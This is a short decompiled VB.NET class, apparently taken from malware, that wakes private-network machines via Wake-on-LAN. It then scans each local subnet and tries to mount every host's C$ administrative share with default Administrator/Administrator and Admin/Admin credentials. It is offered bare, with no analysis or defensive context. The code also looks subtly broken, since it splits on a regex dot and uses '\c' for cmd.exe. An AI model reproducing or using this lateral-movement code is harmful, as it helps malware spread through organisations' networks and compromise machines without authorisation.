Imports System
Imports System.Collections.Generic
Imports System.Text.RegularExpressions

Namespace Complex
	' Token: 0x02000009 RID: 9
	Friend Class AwakeMe
		' Token: 0x0600003A RID: 58 RVA: 0x000072D0 File Offset: 0x000054D0
		Public Shared Sub Wake()
			Dim ipinfo As List(Of IPInfo) = IPInfo.GetIPInfo()
			For Each ipinfo2 As IPInfo In ipinfo
				Try
					If ipinfo2.IPAddress.StartsWith("10.") OrElse ipinfo2.IPAddress.StartsWith("172.16.") OrElse ipinfo2.IPAddress.StartsWith("192.168.") Then
						WakeOnLan.WakeUp(ipinfo2.MacAddress, ipinfo2.IPAddress, "255.255.255.0")
					End If
				Catch
				End Try
			Next
			For Each ipinfo3 As IPInfo In ipinfo
				Try
					Dim regex As Regex = New Regex(".")
					Dim subnet As String = String.Concat(New String() { regex.Split(ipinfo3.IPAddress)(0), ".", regex.Split(ipinfo3.IPAddress)(1), ".", regex.Split(ipinfo3.IPAddress)(2) })
					Dim list As List(Of String) = NetScan.scan(subnet)
					For Each str As String In list
						If ipinfo3.IPAddress.StartsWith("10.") OrElse ipinfo3.IPAddress.StartsWith("172.16.") OrElse ipinfo3.IPAddress.StartsWith("192.168.") Then
							Program.ProcessCommand("cmd.exe", "\c net use * \\" + str + "\C$ /user:Administrator Administrator")
							Program.ProcessCommand("cmd.exe", "\c net use * \\" + str + "\C$ /user:Admin Admin")
						End If
					Next
				Catch
				End Try
			Next
		End Sub
	End Class
End Namespace
